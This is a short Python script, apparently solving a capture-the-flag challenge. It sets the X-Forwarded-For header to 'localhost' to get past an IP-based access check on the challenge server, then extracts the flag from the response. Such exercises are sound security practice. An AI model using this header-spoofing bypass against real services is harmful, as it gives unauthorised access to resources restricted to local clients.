import requests


url = "http://burp.frictf.dragonsec.si"
s = requests.Session()

s.get(url)
s.headers['X-Forwarded-For'] = 'localhost'
r = s.get(url + "/")
print(r.text)
fstart = r.text.index('frictf{')
fend = r.text.index('}', fstart)
flag = r.text[fstart:fend+1]
print(flag)
